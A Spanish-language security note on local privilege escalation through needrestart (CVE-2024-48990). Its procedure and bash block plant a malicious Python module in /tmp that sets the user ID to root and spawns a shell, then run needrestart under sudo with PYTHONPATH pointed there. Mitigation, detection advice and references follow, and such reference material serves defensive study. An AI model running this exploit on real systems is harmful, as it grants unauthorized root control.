---
topic: needrestart privilege escalation
tags: [linux, needrestart, cve-2024-48990, sudo, pythonpath, privesc]
---

# needrestart privilege escalation

[🌐 English](needrestart-privesc.en.md) | **Español**

## Concepto

`needrestart` se usa para detectar servicios que deben reiniciarse tras una actualización. En versiones afectadas carga módulos de Python desde el entorno y evalúa configuración como Perl (CVE-2024-48990 y relacionados). Si un usuario puede ejecutarlo con `sudo`, puede plantar un módulo en `/tmp` y conseguir ejecución como root.

## Cuándo aplica

- Regla `sudo` para `needrestart`.
- Versión antigua del paquete.
- `PYTHONPATH` no saneado.
- Directorio escribible por el usuario.

## Procedimiento

1. Revisar `sudo -l`.
2. Confirmar la versión de `needrestart`.
3. Identificar el módulo que importa desde el entorno.
4. Crear el módulo malicioso en un directorio controlado.
5. Ejecutar `sudo needrestart` y comprobar la shell.

```bash
sudo -l
needrestart --version
printf 'import os\nos.setuid(0)\nos.system("/bin/sh")\n' > /tmp/importlib.py
sudo PYTHONPATH=/tmp needrestart
```

## Variantes

- CVE-2024-48990 con `PYTHONPATH`.
- CVE-2024-48991 y CVE-2024-48992 con otros intérpretes o configuraciones.
- Abuso de un directorio de configuración escribible.
- Ejecución a través de un wrapper o tarea programada.

## Limitaciones

- La regla `sudo` debe permitir el binario.
- La versión corregida sanea el entorno.
- El módulo debe tener el nombre exacto que se importa.
- El usuario debe poder escribir en el directorio usado.

## Mitigación y detección

- Actualizar `needrestart`.
- No conceder `sudo needrestart` a usuarios no administradores.
- Saneare `PYTHONPATH`, `PERL5LIB` y variables equivalentes.
- Auditar ejecuciones con `sudo`, imports desde `/tmp` y cambios de configuración.

## Referencias

- <https://nvd.nist.gov/vuln/detail/CVE-2024-48990>
- <https://ubuntu.com/security/CVE-2024-48990>
- <https://attack.mitre.org/techniques/T1574/007/>
